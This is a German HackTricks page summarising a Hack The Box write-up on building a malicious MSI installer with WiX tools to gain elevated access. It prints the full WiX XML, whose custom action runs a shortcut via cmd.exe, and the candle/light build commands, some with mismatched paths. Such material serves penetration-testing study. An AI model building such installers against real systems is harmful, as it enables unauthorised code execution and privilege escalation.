<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

# Erstellen einer bösartigen MSI und Erlangen von Root-Zugriff

Die Erstellung des MSI-Installationsprogramms erfolgt mit Hilfe von wixtools, genauer gesagt wird [wixtools](http://wixtoolset.org) verwendet. Es sei darauf hingewiesen, dass alternative MSI-Builder in diesem speziellen Fall nicht erfolgreich waren.

Um ein umfassendes Verständnis der Verwendung von wix MSI-Beispielen zu erlangen, empfiehlt es sich, [diese Seite](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) zu konsultieren. Hier finden Sie verschiedene Beispiele, die die Verwendung von wix MSI demonstrieren.

Das Ziel besteht darin, ein MSI zu generieren, das die lnk-Datei ausführt. Um dies zu erreichen, könnte der folgende XML-Code verwendet werden ([XML von hier](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Es ist wichtig zu beachten, dass das Package-Element Attribute wie InstallerVersion und Compressed enthält, die die Version des Installationsprogramms angeben und angeben, ob das Paket komprimiert ist oder nicht.

Der Erstellungsprozess beinhaltet die Verwendung von candle.exe, einem Tool von wixtools, um ein wixobject aus msi.xml zu generieren. Der folgende Befehl sollte ausgeführt werden:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Zusätzlich ist es erwähnenswert, dass im Beitrag ein Bild bereitgestellt wird, das den Befehl und dessen Ausgabe zeigt. Sie können es zur visuellen Orientierung verwenden.

Darüber hinaus wird light.exe, ein weiteres Tool von wixtools, verwendet, um die MSI-Datei aus dem wixobject zu erstellen. Der auszuführende Befehl lautet wie folgt:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Ähnlich wie bei dem vorherigen Befehl ist in diesem Beitrag ein Bild enthalten, das den Befehl und dessen Ausgabe veranschaulicht.

Bitte beachten Sie, dass diese Zusammenfassung zwar wertvolle Informationen liefert, es jedoch empfohlen wird, sich für umfassendere Details und genaue Anweisungen auf den Originalbeitrag zu beziehen.

## Referenzen
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie Pull Requests an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
